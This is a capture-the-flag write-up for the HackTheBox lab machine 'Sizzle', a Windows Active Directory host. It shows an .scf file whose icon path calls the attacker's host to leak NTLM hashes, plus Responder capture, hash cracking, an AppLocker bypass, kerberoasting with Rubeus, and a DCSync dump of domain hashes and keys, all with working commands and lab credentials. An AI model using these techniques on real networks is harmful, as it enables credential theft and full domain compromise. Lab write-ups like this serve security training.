# Sizzle
>Author : Xyan1d3
>Date : 14th July 2021
>IP : 10.10.10.103
>OS : Windows Active Directory
>Difficulty : Insane
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Wed Jul 14 11:50:14 2021 as: nmap -sC -sV -v -oN nmap/sizzle 10.10.10.103
Nmap scan report for 10.10.10.103
Host is up (0.061s latency).
Not shown: 987 filtered ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2021-07-14T06:21:53+00:00; +3s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2021-07-14T06:21:53+00:00; +3s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2021-07-14T06:21:53+00:00; +4s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2021-07-14T06:21:53+00:00; +3s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2021-07-14T06:21:53+00:00; +3s from scanner time.
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-14T06:21:15
|_  start_date: 2021-07-14T06:18:50
```

## Nmap all open ports with scripts
```sql
# Nmap 7.91 scan initiated Wed Jul 14 12:00:24 2021 as: nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49666,49668,49677,49688,49689,49690,49693,49699,49708,49714 -A -oN nmap/sizzle-deep -v 10.10.10.103
Nmap scan report for 10.10.10.103
Host is up (0.096s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2021-07-14T06:32:30+00:00; +4s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2021-07-14T06:32:29+00:00; +3s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2021-07-14T06:32:29+00:00; +3s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2021-07-14T06:32:30+00:00; +3s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-03T17:58:55
| Not valid after:  2020-07-02T17:58:55
| MD5:   240b 1eff 5a65 ad8d c64d 855e aeb5 9e6b
|_SHA-1: 77bb 3f67 1b6b 3e09 b8f9 6503 ddc1 0bbf 0b75 0c72
|_ssl-date: 2021-07-14T06:32:29+00:00; +3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Issuer: commonName=HTB-SIZZLE-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-07-02T20:26:23
| Not valid after:  2019-07-02T20:26:23
| MD5:   acd1 5e32 da9d 89e2 cde5 7b46 ca12 1d5e
|_SHA-1: 06b2 0070 6600 2651 4c70 054f b1aa 9c15 cadd f233
|_ssl-date: 2021-07-14T06:32:29+00:00; +3s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  unknown
49699/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  unknown
49714/tcp open  msrpc         Microsoft Windows RPC

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-14T06:31:50
|_  start_date: 2021-07-14T06:18:50

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   62.03 ms 10.10.14.1
2   65.29 ms 10.10.10.103
```
## Crackmapexec
```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle]
└──╼ # crackmapexec smb 10.10.10.103
SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
```

We have a domain name of the box as `HTB.LOCAL` and the box name as `SIZZLE`.
## Gobuster
```python
/images               (Status: 301) [Size: 150] [--> http://10.10.10.103/images/]
/aspnet_client        (Status: 301) [Size: 157] [--> http://10.10.10.103/aspnet_client/]
/Images               (Status: 301) [Size: 150] [--> http://10.10.10.103/Images/]
/.                    (Status: 200) [Size: 60]
/IMAGES               (Status: 301) [Size: 150] [--> http://10.10.10.103/IMAGES/]
/Aspnet_client        (Status: 301) [Size: 157] [--> http://10.10.10.103/Aspnet_client/]
/aspnet_Client        (Status: 301) [Size: 157] [--> http://10.10.10.103/aspnet_Client/]
/ASPNET_CLIENT        (Status: 301) [Size: 157] [--> http://10.10.10.103/ASPNET_CLIENT/]
/certsrv              (Status: 401) [Size: 1293]
```
We have a `certsrv` directory which is used to sign the `csr` files by the `Active Directory Domain Controller`
## FTP Enumeration
```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle]
└──╼ # ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name (10.10.10.103:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> ls -a
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> put test
local: test remote: test
200 PORT command successful.
550 Access is denied.
```

FTP has `anonymous` login enabled but neither it has any files inside nor we can put any files inside.

## SMB Enumeration
```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle]
└──╼ # smbclient -N -L \\10.10.10.103

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        Department Shares Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Operations      Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

We don't have access to the `ADMIN$`, `C$` , `CertEnroll` shares.
But,We do have access to the `Department Shares` share in `smb`.

We have a lot of directories inside the `Department Shares` share.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle]
└──╼ # smbclient '\\10.10.10.103\Department Shares'
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul  3 20:52:32 2018
  ..                                  D        0  Tue Jul  3 20:52:32 2018
  Accounting                          D        0  Tue Jul  3 00:51:43 2018
  Audit                               D        0  Tue Jul  3 00:44:28 2018
  Banking                             D        0  Tue Jul  3 20:52:39 2018
  CEO_protected                       D        0  Tue Jul  3 00:45:01 2018
  Devops                              D        0  Tue Jul  3 00:49:33 2018
  Finance                             D        0  Tue Jul  3 00:41:57 2018
  HR                                  D        0  Tue Jul  3 00:46:11 2018
  Infosec                             D        0  Tue Jul  3 00:44:24 2018
  Infrastructure                      D        0  Tue Jul  3 00:43:59 2018
  IT                                  D        0  Tue Jul  3 00:42:04 2018
  Legal                               D        0  Tue Jul  3 00:42:09 2018
  M&A                                 D        0  Tue Jul  3 00:45:25 2018
  Marketing                           D        0  Tue Jul  3 00:44:43 2018
  R&D                                 D        0  Tue Jul  3 00:41:47 2018
  Sales                               D        0  Tue Jul  3 00:44:37 2018
  Security                            D        0  Tue Jul  3 00:51:47 2018
  Tax                                 D        0  Tue Jul  3 00:46:54 2018
  Users                               D        0  Wed Jul 11 03:09:32 2018
  ZZ_ARCHIVE                          D        0  Tue Jul  3 01:02:58 2018

                7779839 blocks of size 4096. 3332354 blocks available
```

We could mount the share on our box to take a look at the share more nicely.

After enumerating the share we find out that we have a lot of files on `ZZ_ARCHIVE` folder but all are just empty files.

Also, All other directories are non writable except the `Users/Public/` directory which makes me think of the Desktop of the public.
So, Maybe we could put a malicious `scf` link on this share and put the image location of this file on to our box and start up `responder` with which we maybe able to get an hash.

The scf file contents:
```txt
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle]
└──╼ # cat magisk.scf 
[Shell]
Command=1
IconFile=\\10.10.14.8\shares\nc.ico
[Taskbar]
Command=ToggleDesktop
```

After copying it to the `Users\Public` folder we startup responder and capture the hash.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle]
└──╼ # responder -I tun0 -rdwv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]   
    NBT-NS                     [ON]       
    DNS/MDNS                   [ON]

[+] Servers:                            
    HTTP server                [ON]   
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]     
    DNS server                 [ON]
	LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.8]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-7I8SBR2295D]
    Responder Domain Name      [HEAU.LOCAL]
    Responder DCE-RPC Port     [49052]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.10.103
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:4e645d26d1c1c4df:E05445CB73E9471A8EE4B1F71135D382:0101000000000000003FF132AF78D7012C23EE0D20E322FB0000000002000800480045004100550
001001E00570049004E002D003700490038005300420052003200320039003500440004003400570049004E002D00370049003800530042005200320032003900350044002E0048004500410055002E004C004F00
430041004C000300140048004500410055002E004C004F00430041004C000500140048004500410055002E004C004F00430041004C0007000800003FF132AF78D7010600040002000000080030003000000000000
000010000000020000009CF8376317ADD2E70D931615EEACE78663561A5293CDA5847A18A3E7170ACF70A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030
002E00310034002E003800000000000000000000000000
```

We could crack the hash with JtR and get the password.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle]
└──╼ # john amanda-responder.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:09 23.60% (ETA: 13:24:25) 0g/s 397312p/s 397312c/s 397312C/s squawks..sq1620
Ashare1972       (amanda)
1g 0:00:00:35 DONE (2021-07-14 13:24) 0.02805g/s 320330p/s 320330c/s 320330C/s Ashiah08..Arsenic
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

We get the password for `amanda` user to be `Ashare1972`.

We could verify our credentials with `crackmapexec`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle]
└──╼ # crackmapexec smb 10.10.10.103 -u amanda -p Ashare1972
SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.103    445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1972
```

We could not do `winrm` into the box with the password as because it probaly requires us to do a certificate authentication.

## Cerificate Signing
We see that we have a `certsrv` directory on the webserver which previously required authentication. But, We could now login to the `certsrv` using the `amanda` credentials.

We have to generate a private key with `openssl` and generate a `csr` which is a certificate signing request.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle/cert]
└──╼ # openssl req -newkey rsa:2048 -keyout priv.key -out signinreq.csr
Generating a RSA private key
..............................................+++++
...................................................................+++++
writing new private key to 'priv.key'
Enter PEM pass phrase:    
Verifying - Enter PEM pass phrase:    
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,     
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []: 
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```

![[Pasted image 20210714135743.png]]
![[Pasted image 20210714135817.png]]
![[Pasted image 20210714142120.png]]
After downloading the certificate we could use `evil-winrm` to get into the box.

# Initial FootHold as amanda
```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle/cert]
└──╼ # evil-winrm -i 10.10.10.103 -u amanda -p Ashare1972 -k priv.key -c amanda-sizzle-signed.cer --ssl

Evil-WinRM shell v2.4

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\amanda\Documents> whoami
htb\amanda
```

## Domain Enumeration with Bloodhound 
We could run `bloodhound` on the box as we have a valid credentials.
I will be doing the most daring trick and will be using `bloodhound-python` as its syntax is like very stupid.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle/bloodhound]
└──╼ # bloodhound-python -u amanda -p Ashare1972 -ns 10.10.10.103 -d htb.local -c All
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
WARNING: Could not resolve SID: S-1-5-21-2379389067-1826974543-3574127760-1000
INFO: Found 7 users
INFO: Connecting to GC LDAP server: sizzle.HTB.LOCAL     
INFO: Found 52 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: sizzle.HTB.LOCAL
INFO: User Guest is logged in on sizzle.HTB.LOCAL from 10.10.14.8
WARNING: Could not resolve hostname to SID: 10.10.14.8
INFO: Done in 00M 21S
```

We upload it to `bloodhound` and start to analyze it.
Here, We see two things, 1st of all the user `mrlky` user has `DCSync` rights.
![[Pasted image 20210714145654.png]]

The 2nd thing is that we have is that user `mrlky` user is kerberoastable.
![[Pasted image 20210714145808.png]]

Most, Of the ways of doing kerberoasting is not working as we are in a powershell contrained language mode. Which does not allow us to `Import-Module` to `Invoke-Kerberoast`.

We could run `Rubeus.exe` but we could not execute the file due to the `Applocker`

But, We have some common whitelist like `C:\Windows\Temp`, `C:\Windows\tracing`.

We run `Rubeus.exe` to do a kerberoast on the `mrlky` user.
```python
*Evil-WinRM* PS C:\Windows\tracing> C:\Windows\Temp\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
Enter PEM pass phrase:
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
                                          
[*] Searching path 'LDAP://htb.local' for Kerberoastable users

[*] Total kerberoastable users : 1


[*] SamAccountName         : mrlky
[*] DistinguishedName      : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
[*] ServicePrincipalName   : http/sizzle
[*] PwdLastSet             : 7/10/2018 6:08:09 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$23377B2964A22004BDB2BB7F76D18359$CAEC089932C3F816CE69CB9DC86387FA8040098BE0B7BDA76A5E6AFE00849A209506B28F688DCC42131EEDD8DCD874D7F5BC9ADE7551FCD1EA68AF16CD7E22711F17C0663E8832B4737622AF9110A5DA3AAAF6E901A104201677DBD0042A20C12D8C8509B34E8F1FE10AE938E4711026F2E6B9B9613643BF9AF522D1420B5E87662E07544EA9AA4FCEC70868C0A78466F79C66639242779B0ADB8BD60E8B5999A6C145926BA794A1C18FA91FDEC8F34009FE07DDE315F0D808F4781B8E5E74FBD8FA22B4A6F10067C60BDD8B00608C4C200218EC296A83CD55EE0673D8E072A0A96E9DF6F6DFCB81A01CE78020086163BC986FDBB424A7B6D1059A728D1A00DEE090080A68970DA20731557C3B2451131C28B8FAC6B075134BC57C71EDA2BFCA076D28618D307B16C63C3BAF071396D15CD1D07DC5DE7D40C2CB952F9CF9EA66EF7E1A278E04A948CC9A009955D92213918E526A4C400FD0205FD5898D95AE3F33F1F1C3A442D1707D900A45C215F22E534852DCAD0F56006BD36EC21FFE85DD6AD40C919905AEE48E336CA71623FAA4672AB5600B5C745A05301EF5B4656E6E1C9855DBC29902F2F98E3393D69A272526DE80617B789EFE26C7A7A976F5559D3DF9F43FBBB9E9B19F3BE24786B7B1CF2608C806EC97AA7CBC2607C5044268AE3A8713831F882375AC69B10E7A9A3564CDAEFF11F368F1BDA6244528FF6776795BD051A20A3887074E2E7927724FF6A47D397EFA567A0D5A553F4F96EB2852E3903FC71365C2E106CE884564DA569A475303A944097DC96DE73F77116D4727ED326CCF7A910B3856DFA313F33D715F4BC7CA38EE1A152674E4F4A63923E7C9AACECA01F22073A7DD350DF5367B1BD04871C57B191C647151C011ED259B1B46EE569F25CDC00B05A4739F4BB9A6C10BC2E59A99FE5A27A9B52C3ACE122C6EDB36787B955EA0F9CCEB0B82A4A85B4F4874C4E4AA4A8C615BDC2C34D1D52E85E2AFABAC7DA9DED2061C3F3797DDEB9628535D7FF20AC3B5F6E3EAA9F49AF8F887D546A5621B585E0665A823EABBE5C3A0BFECFBD48F90D4EE2FE52DBB230F1A17F15342BCC99456248F8B673F89576A75991CAD96B9E05675E371F7FAF96FEDD545E551E71F4DA1ACA7F73236BAA0CF2A4ED89D6F68EBE1B291C4D4694CEBB3A08E02FF27FFA690BEF6122A569D63D8B7A211907142C98F60B4CF69664ADC884832C9C6060AAB8ECCFC85333A15A254636C004B7F0001CFFDEC7BDA006836DDC2442B53D15F320C77710BF6A5DDA25DCE2289279390BA85BF77BC8194895F90BDCAD3DCB144B01C577DF8D6DB171F7D34B03F859092B18C3D93F51D365ECE2D51C15930AE9C4922
```

We crack the Kerberoasted account hash.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle/]
└──╼ # john hashes --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Football#7       (?)
1g 0:00:00:16 DONE (2021-07-14 20:00) 0.06207g/s 693186p/s 693186c/s 693186C/s Forever3!..FokinovaS1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

# Root Escalation
We could now use the credentials of `mrlky` to do a `DCSync` using `secretsdump.py`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.8]─[~/htb/sizzle]
└──╼ # secretsdump.py mrlky@10.10.10.103
Impacket v0.9.23.dev1+20210419.165326.f9453d21 - Copyright 2020 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:c745ccbe43bc9e7982cd5d7027cbdfed:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
Administrator:des-cbc-md5:ad7afb706715e964
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
krbtgt:des-cbc-md5:866db35eb9ec5173
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
amanda:des-cbc-md5:70ba677a4c1a2adf
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
